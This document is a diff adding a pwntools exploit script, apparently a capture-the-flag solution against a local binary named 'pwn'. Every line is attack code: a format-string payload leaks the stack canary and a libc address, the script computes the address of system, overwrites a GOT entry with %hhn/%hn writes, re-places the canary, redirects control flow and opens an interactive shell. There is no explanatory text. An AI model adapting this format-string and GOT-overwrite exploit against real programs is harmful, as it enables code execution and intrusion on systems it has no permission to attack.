@@ -1,0 +1,26 @@
+from pwn import *
+io=process('./pwn')
+libc=ELF('./libc.so.6')
+context.arch='amd64'
+payload=b'%19$p%3$p'
+io.send(payload)
+io.recvuntil(b"0x")
+canary=int(io.recv(16),16)
+base=int(io.recv(14),16)-libc.sym.read-18
+print(hex(canary))
+print(hex(base))
+got=0x404030
+gdb.attach(io)
+system=base+libc.sym.system
+t1=system&0xff
+t2=((system-t1)>>8)&0xffff
+print(hex(system))
+print(hex(t1))
+print(hex(t2))
+payload=f"%{t1}c%12$hhn%{t2-t1}c%13$hn"
+payload=payload.ljust(0x30,'\x00')
+payload=payload.encode()
+payload+=p64(got)+p64(got+1)
+payload=payload.ljust(0x68,b'\x00')+p64(canary)+p64(0x404800)+p64(0x4011F0)
+io.send(payload)
+io.interactive()
